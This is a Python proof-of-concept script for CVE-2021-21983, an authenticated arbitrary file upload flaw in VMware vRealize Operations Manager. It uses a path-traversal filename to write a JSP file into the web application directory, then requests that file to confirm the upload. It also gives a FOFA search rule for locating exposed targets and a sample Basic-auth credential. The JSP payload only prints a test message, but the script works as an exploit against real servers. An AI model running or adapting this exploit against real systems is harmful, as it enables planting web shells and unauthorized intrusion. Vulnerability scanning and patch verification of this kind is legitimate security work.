#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import io

from Config.config_proxies import proxies
from Config.config_requests import ua


requests.packages.urllib3.disable_warnings()


# 脚本信息
######################################################
NAME='CVE-2021-21983'
AUTHOR="境心"
REMARK='VMware vRealize 认证后任意文件上传漏洞'
FOFA_RULE='app="vmware-vRealize-Operations-Manager"'
######################################################

def poc_content(filename1):
    content = """------WebKitFormBoundarypyfBh1YB4pV8McGB\r\nContent-Disposition: form-data; name="name"\r\n\r\n../../../../../usr/lib/vmware-casa/casa-webapp/webapps/casa/{0}\r\n------WebKitFormBoundarypyfBh1YB4pV8McGB\r\nContent-Disposition: form-data; name="file"; filename=""\r\nContent-Type: image/jpeg\r\n\r\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\r\n<% out.print("this is a friendly test, Please check and repair upload vulnerabilities.");\r\n%>\r\n------WebKitFormBoundarypyfBh1YB4pV8McGB--""".format(filename1)
    mem_string = io.StringIO()
    mem_string.write(content)
    mem_string.seek(0)
    return mem_string

def poc(target,exp=None):
    if exp:
        result = {}
        url = target + "/casa/private/config/slice/ha/certificate"
        headers = {
            "User-Agent" : ua,
            "Content-Type" : "multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB",
            "Authorization" : "Basic %s" % exp
        }
        filename1 = "abctestabc.jsp"
        mem_string = poc_content(filename1)
        res = requests.post(url, headers=headers, data=mem_string.read(), verify=False, timeout=5,proxies=proxies)
        if res.status_code == 200:
            poc_url = target + "/casa/%s" %filename1
            poc_res = requests.get(poc_url, headers=headers, verify=False, timeout=5,proxies=proxies)
            if "this is a friendly test, Please check and repair upload vulnerabilities." in poc_res.text:
            # if  poc_res.status_code == 200:            # exp的时候作为判断使用，注释掉上面一句判断，并取消这个注释
                result['poc'] = NAME
                result['poc_url'] = poc_url
                result['message'] = "存在%s" % REMARK
                # print(result)
                return result
    else:
        return "认证信息为空，请先获取并传入认证信息"

if __name__ == '__main__':
    # poc调用
    poc("https://127.0.0.1/","YWRtaW46QWRtaW5AMTIz")